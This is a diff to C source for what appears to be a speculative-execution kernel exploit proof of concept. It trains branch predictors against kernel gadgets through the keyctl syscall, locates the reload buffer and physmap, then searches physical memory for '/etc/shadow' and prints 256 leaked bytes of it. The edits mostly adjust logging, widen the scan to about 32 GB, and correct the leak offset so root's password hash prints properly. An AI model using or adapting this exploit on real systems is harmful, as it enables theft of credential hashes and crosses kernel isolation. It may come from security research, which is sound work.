@@ -24,6 +24,7 @@
 
 #define LEAK_ROUNDS 16
 #define THRESHOLD (LEAK_ROUNDS / 4)
+#define MEMORY_SIZE ((32ul + 2) << 30) // assume 32GB of memory (+2 to account for gaps in physical memory)
 
 #define SYS_NR_ATTACK SYS_keyctl
 
@@ -239,14 +240,19 @@ void leak_memory(exp_params_t *params, u64 secret_ptr, uint8_t *buf, size_t num_
 const char ETC_SHADOW_START[] = "root:$";
 u64 find_etc_shadow(exp_params_t *params, u64 physmap_addr)
 {
-    // search from the back as the file cache on our server seems to be located there???
-    for (u64 offset = 0; offset < (8 * 1024 * 1024) + (1024 * 1024); offset++)
+    INFO("### search /etc/shadow ###");
+    for (u64 offset = 0; offset < (MEMORY_SIZE >> 12); offset++)
     {
+        if (offset % 0x10000 == 0)
+        {
+            printf("\nsearching at 0x%016lx: ", offset << 12);
+        }
         if (offset % 0x1000 == 0)
         {
-            printf("searching at offset 0x%012lx\n", offset);
+            printf(".");
             fflush(stdout);
         }
+
         // this performs an IBPB
         int c;
         for (c = 0; c < sizeof(ETC_SHADOW_START) - 1; ++c)
@@ -276,7 +282,8 @@ u64 find_etc_shadow(exp_params_t *params, u64 physmap_addr)
 
         if (c == sizeof(ETC_SHADOW_START) - 1)
         {
-            INFO("found /etc/shadow at offset 0x%012lx\n", offset);
+            printf("\n");
+            INFO("shadow_offset: 0x%016lx\n", offset << 12);
             return (physmap_addr + (offset << 12));
         }
     }
@@ -286,15 +293,16 @@ u64 find_etc_shadow(exp_params_t *params, u64 physmap_addr)
 
 u64 find_rb_offset(exp_params_t *params)
 {
-    INFO("find rb_offset\n");
+    INFO("search rb_offset: ");
     fflush(stdout);
     registers_t *train = params->train;
 
-    for (u64 offset = 1; offset <= (16 * 1024); ++offset)
+    for (u64 offset = 1; offset <= (MEMORY_SIZE >> 21); ++offset)
     {
-        if (offset % 0x1000 == 0)
+        if (offset % 0x200 == 1)
         {
-            INFO("rb_offset = 0x%012lx\n", (offset << 21));
+            // INFO("rb_offset = 0x%012lx\n", (offset << 21));
+            printf(".");
         }
 
         run_params_t run_params = {
@@ -307,16 +315,18 @@ u64 find_rb_offset(exp_params_t *params)
         };
         if (check_signal(&run_params))
         {
+            printf("\n");
             return offset;
         }
     }
 
+    printf("\n");
     return 0;
 }
 
 u64 find_physmap_offset(exp_params_t *params, u64 rb_offset)
 {
-    INFO("find physmap_offset\n");
+    INFO("search physmap_offset: ");
     fflush(stdout);
 
     registers_t *train = params->train;
@@ -326,7 +336,8 @@ u64 find_physmap_offset(exp_params_t *params, u64 rb_offset)
     {
         if (big_offset % 0x1000 == 0)
         {
-            INFO("big_offset = 0x%012lx\n", params->kernel_addrs->physmap_base + (big_offset << 21));
+            // INFO("big_offset = 0x%012lx\n", params->kernel_addrs->physmap_base + (big_offset << 21));
+            printf(".");
         }
 
         run_params_t run_params = {
@@ -339,15 +350,19 @@ u64 find_physmap_offset(exp_params_t *params, u64 rb_offset)
         };
         if (check_signal(&run_params))
         {
+            printf("\n");
             return big_offset;
         }
     }
 
+    printf("\n");
     return 0xFFFFFFFFFFFFFFFF;
 }
 
 u64 find_reload_buffer(exp_params_t *params, u64 *physmap_addr_ptr)
 {
+    INFO("### search reload buffer ###\n");
+
     clock_t start_rb = clock();
     u64 rb_offset = find_rb_offset(params);
     if (!rb_offset)
@@ -356,9 +371,8 @@ u64 find_reload_buffer(exp_params_t *params, u64 *physmap_addr_ptr)
         return 0;
     }
     clock_t end_rb = clock();
-    INFO("rb = %fs\n", ((double)(end_rb - start_rb)) / CLOCKS_PER_SEC);
-    INFO("rb_offset: 0x%lx\n", rb_offset);
-    INFO("rb_offset_based: 0x%lx\n", params->kernel_addrs->physmap_base + (rb_offset << 21));
+    INFO("rb_offset time: %fs\n", ((double)(end_rb - start_rb)) / CLOCKS_PER_SEC);
+    // INFO("rb_offset_base: 0x%lx\n", params->kernel_addrs->physmap_base + (rb_offset << 21));
     fflush(stdout);
 
     clock_t start_pm = clock();
@@ -369,19 +383,22 @@ u64 find_reload_buffer(exp_params_t *params, u64 *physmap_addr_ptr)
         return 0;
     }
     clock_t end_pm = clock();
-    INFO("pm = %fs\n", ((double)(end_pm - start_pm)) / CLOCKS_PER_SEC);
-    INFO("physmap_offset: 0x%lx\n", physmap_offset);
+    INFO("physmap_offset time: %fs\n", ((double)(end_pm - start_pm)) / CLOCKS_PER_SEC);
     fflush(stdout);
 
     u64 physmap_addr = params->kernel_addrs->physmap_base + (physmap_offset << 30);
-    INFO("physmap_addr: 0x%lx\n", physmap_addr);
     if (physmap_addr_ptr)
     {
         *physmap_addr_ptr = physmap_addr;
     }
 
     u64 rb_addr = physmap_addr + (rb_offset << 21);
-    INFO("rb_addr: 0x%lx\n", rb_addr);
+    INFO("%-15s 0x%016lx\n", "rb_offset:", rb_offset << 21);
+    INFO("%-15s 0x%016lx\n", "physmap_offset:", physmap_offset << 30);
+    INFO("%-15s 0x%016lx\n", "physmap_addr:", physmap_addr);
+    INFO("%-15s 0x%016lx\n", "rb_addr:", rb_addr);
+
+    printf("\n");
 
     return rb_addr;
 }
@@ -393,7 +410,7 @@ int main(int argc, char *argv[])
         err(1, "Usage %s <mode (0,1)> <kaslr_offset> ", argv[0]);
     }
 
-    INFO("init\n");
+    INFO("### init ###\n");
     clock_t start_setup = clock();
 
     rb_init();
@@ -407,7 +424,7 @@ int main(int argc, char *argv[])
     }
     else
     {
-        INFO("mode /etc/shadow\n");
+        INFO("mode: /etc/shadow\n");
     }
     fflush(stdout);
 
@@ -422,12 +439,12 @@ int main(int argc, char *argv[])
         .physmap_base = kernel_addrs_nokaslr.physmap_base,
     };
 
-    INFO("kernel_offset: 0x%012lx\n", kernel_offset);
-    INFO("call_gadget_ptr: 0x%012lx\n", kernel_addrs_kaslr.call_gadget_ptr);
-    INFO("leak_gadget_ptr: 0x%012lx\n", kernel_addrs_kaslr.leak_gadget_ptr);
-    INFO("addr_gadget_ptr: 0x%012lx\n", kernel_addrs_kaslr.addr_gadget_ptr);
-    INFO("page_offset_ptr: 0x%012lx\n", kernel_addrs_kaslr.page_offset_ptr);
-    INFO("physmap_base: 0x%012lx\n", kernel_addrs_kaslr.physmap_base);
+    INFO("%-16s 0x%016lx\n", "kernel_offset:", kernel_offset);
+    INFO("%-16s 0x%016lx\n", "call_gadget_ptr:", kernel_addrs_kaslr.call_gadget_ptr);
+    INFO("%-16s 0x%016lx\n", "leak_gadget_ptr:", kernel_addrs_kaslr.leak_gadget_ptr);
+    INFO("%-16s 0x%016lx\n", "addr_gadget_ptr:", kernel_addrs_kaslr.addr_gadget_ptr);
+    INFO("%-16s 0x%016lx\n", "page_offset_ptr:", kernel_addrs_kaslr.page_offset_ptr);
+    // INFO("%-16s 0x%012lx\n", "physmap_base:", kernel_addrs_kaslr.physmap_base);
     fflush(stdout);
 
     // create the training setup
@@ -452,16 +469,16 @@ int main(int argc, char *argv[])
     // a target that aligns with the disclosure gadget
     if (init_snip(&train_dst_snip, train_dst_addr, train_dst))
     {
-        INFO("ts: 0x%012lx - 0x%012lx\n", train_src_addr, train_src_addr + snip_sz(train_src));
-        INFO("td: 0x%012lx - 0x%012lx\n", train_dst_addr, train_dst_addr + snip_sz(train_dst));
+        INFO("ts: 0x%012lx - 0x%016lx\n", train_src_addr, train_src_addr + snip_sz(train_src));
+        INFO("td: 0x%012lx - 0x%016lx\n", train_dst_addr, train_dst_addr + snip_sz(train_dst));
 
         err(1, "train_dst_snip");
     }
     // a target that aligns with the physmap derandomization gadget
     if (init_snip(&train_physmap_dst_snip, train_physmap_dst_addr, train_dst))
     {
-        INFO("ts: 0x%012lx - 0x%012lx\n", train_src_addr, train_src_addr + snip_sz(train_src));
-        INFO("td: 0x%012lx - 0x%012lx\n", train_dst_addr, train_dst_addr + snip_sz(train_dst));
+        INFO("ts: 0x%012lx - 0x%016lx\n", train_src_addr, train_src_addr + snip_sz(train_src));
+        INFO("td: 0x%012lx - 0x%016lx\n", train_dst_addr, train_dst_addr + snip_sz(train_dst));
 
         err(1, "train_dst_snip");
     }
@@ -483,7 +500,7 @@ int main(int argc, char *argv[])
     };
 
     clock_t end_setup = clock();
-    INFO("setup  = %fs\n", ((double)(end_setup - start_setup)) / CLOCKS_PER_SEC);
+    INFO("init time: %fs\n\n", ((double)(end_setup - start_setup)) / CLOCKS_PER_SEC);
     fflush(stdout);
 
     // find the location of the reload buffer in physmap
@@ -514,7 +531,7 @@ int main(int argc, char *argv[])
         u64 secret_ptr = 0;
         if (secret_get_addr(&secret_ptr))
             err(1, "failed to get secret addr\n");
-        INFO("secret_ptr: 0x%012lx\n", secret_ptr);
+        INFO("secret_ptr: 0x%016lx\n", secret_ptr);
         fflush(stdout);
 
         // leak the secret memory
@@ -523,8 +540,8 @@ int main(int argc, char *argv[])
         clock_t start = clock();
         leak_memory(&params, secret_ptr, secret, SECRET_DATA_SIZE);
         clock_t end = clock();
-        INFO("secret_size = %db\n", SECRET_DATA_SIZE);
-        INFO("secret_leak = %fs\n", ((double)(end - start)) / CLOCKS_PER_SEC);
+        INFO("secret_size: %db\n", SECRET_DATA_SIZE);
+        INFO("secret_leak: %fs\n", ((double)(end - start)) / CLOCKS_PER_SEC);
         fflush(stdout);
 
         // get data to compare to
@@ -542,40 +559,37 @@ int main(int argc, char *argv[])
                 ++mistakes;
             }
         }
-        INFO("mistakes = %ld\n", mistakes);
+        INFO("mistakes: %ld\n", mistakes);
         fflush(stdout);
     }
     else
     {
         // /etc/shadow leak mode
 
-        INFO("find /etc/shadow\n");
         fflush(stdout);
         clock_t find_start = clock();
         u64 secret_ptr = find_etc_shadow(&params, physmap_addr);
         clock_t find_end = clock();
-        INFO("shadow_find = %fs\n", ((double)(find_end - find_start)) / CLOCKS_PER_SEC);
+        INFO("shadow search time: %fs\n\n", ((double)(find_end - find_start)) / CLOCKS_PER_SEC);
         fflush(stdout);
 
-        INFO("leak /etc/shadow\n");
+        INFO("### leak /etc/shadow ###\n");
         fflush(stdout);
 #define SECRET_SIZE 256
         uint8_t secret[SECRET_SIZE];
         clock_t shadow_start = clock();
-        leak_memory(&params, secret_ptr + 1, secret, SECRET_SIZE);
+        leak_memory(&params, secret_ptr, secret, SECRET_SIZE);
         clock_t shadow_end = clock();
-        INFO("shadow_leak = %fs\n", ((double)(shadow_end - shadow_start)) / CLOCKS_PER_SEC);
-        fflush(stdout);
 
         INFO("/etc/shadow:\n");
-        INFO("===========================================\n");
-        printf("r");
         for (int i = 0; i < SECRET_SIZE; ++i)
         {
             printf("%c", secret[i]);
         }
         printf("\n");
-        INFO("===========================================\n");
+        fflush(stdout);
+
+        INFO("shadow leak time: %fs\n", ((double)(shadow_end - shadow_start)) / CLOCKS_PER_SEC);
         fflush(stdout);
     }
 
